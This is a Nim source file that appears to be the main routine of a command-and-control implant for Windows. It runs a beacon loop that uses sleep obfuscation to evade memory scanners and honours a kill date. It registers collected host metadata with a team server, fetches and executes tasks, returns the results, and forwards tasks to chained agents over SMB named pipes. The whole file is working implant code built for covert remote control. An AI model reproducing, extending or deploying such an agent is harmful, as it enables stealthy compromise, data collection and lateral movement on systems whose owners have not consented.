import winim/lean
import times, system, random, strformat, tables
import core/[context, sleepmask, exit, transport]
import utils/io
import core/transport/smb
import protocol/[task, result, registration]
import ../common/[types, utils, crypto, serialize]

proc main() = 
    randomize()

    # Initialize agent context
    var ctx = AgentCtx.init()
    if ctx == nil: 
        quit(0)

    #[
        Agent routine: 
        1. Sleep obfuscation
        2. Check kill date
        3. Register to the team server if not already connected
        4. Retrieve tasks via checkin request to a GET endpoint
        5. Execute task and post result
        6. If additional tasks have been fetched, go to 6.
        7. If no more tasks need to be executed, go to 1. 
    ]#
    while true: 
        try: 
            # Sleep obfuscation to evade memory scanners
            sleepObfuscate(ctx.sleepSettings)

            # Check kill date and exit the agent process if it is reached
            if ctx.killDate != 0 and now().toTime().toUnix().int64 >= ctx.killDate: 
                print protect("[*] Reached kill date: "), ctx.killDate.fromUnix().utc().format("dd-MM-yyyy HH:mm:ss"), protect(" (UTC).")
                print protect("[*] Exiting.") 
                exit()
            
            # Register
            if not ctx.registered: 
                # Create registration payload   
                var registration: Registration = ctx.collectAgentMetadata()
                let registrationBytes = ctx.serializeRegistrationData(registration)

                if ctx.sendData(@[uint8(1)] & uint32.toBytes(cast[uint32](registrationBytes.len())) & registrationBytes): 
                    print fmt"[+] [{ctx.agentId}] Agent registered."
                    ctx.registered = true
                else: 
                    print protect("[-] Agent registration failed.") 
                    continue

            let date: string = now().format(protect("dd-MM-yyyy HH:mm:ss"))
            print "\n", fmt"[*] [{date}] Checking in."

            # Check if there are results of linked agents that need to be returned
            for agentId, hPipe in ctx.links: 
                let resultBytes = pipeRead(cast[HANDLE](hPipe))
                if resultBytes.len() > 0:
                    ctx.sendData(resultBytes)

            # Retrieve task queue for the current agent by sending a check-in/heartbeat request
            # The check-in request contains the agentId and listenerId, so the server knows which tasks to return
            let packet: string = ctx.getTasks()
            if packet.len <= 0: 
                print protect("[*] No tasks to execute.") 
                continue

            var tasks: Table[string, seq[seq[byte]]] = ctx.deserializePacket(packet)
            if tasks.len <= 0: 
                print protect("[*] No tasks to execute.")
                continue

            # Handle task execution
            var packer = Packer.init()
            var numResults: int = 0
            var directLinkedTasks = initTable[string, seq[seq[byte]]]() 
            var indirectPacker = Packer.init()    

            for agentId, agentTasks in tasks:
                
                # Execute tasks belonging to the current agent 
                if agentId == ctx.agentId:
                    for task in agentTasks:
                        var result: TaskResult = ctx.handleTask(ctx.deserializeTask(task))
                        let resultBytes: seq[byte] = ctx.serializeTaskResult(result)
                        inc numResults
                        packer.addDataWithLengthPrefix(resultBytes)

                # If the task is for a direct child it is not forwarded to all linked agents, only to the one it is for
                elif ctx.links.hasKey(string.toUuid(agentId)): 
                    directLinkedTasks[agentId] = agentTasks

                # Pack tasks that need to be forwarded to linked agents
                else: 
                    indirectPacker.add(string.toUuid(agentId))
                    indirectPacker.add(cast[uint8](agentTasks.len()))
                    for task in agentTasks:
                        indirectPacker.addDataWithLengthPrefix(task)
    
            let indirectTasks = indirectPacker.pack()
            for linkedAgentId in ctx.links.keys:
                let directTasks = directLinkedTasks.getOrDefault(Uuid.toString(linkedAgentId), @[])

                # Forward direct and indirect tasks to the directly linked children
                if directTasks.len() > 0 or indirectTasks.len() > 0:
                    if ctx.forward(linkedAgentId, directTasks, indirectTasks):
                        print fmt"   [+] Forwarding tasks to agent {Uuid.toString(linkedAgentId)}."

            ctx.sendData(@[uint8(numResults)] & packer.pack())

        except CatchableError as err: 
            print protect("[-] "), err.msg

when isMainModule:
    main() 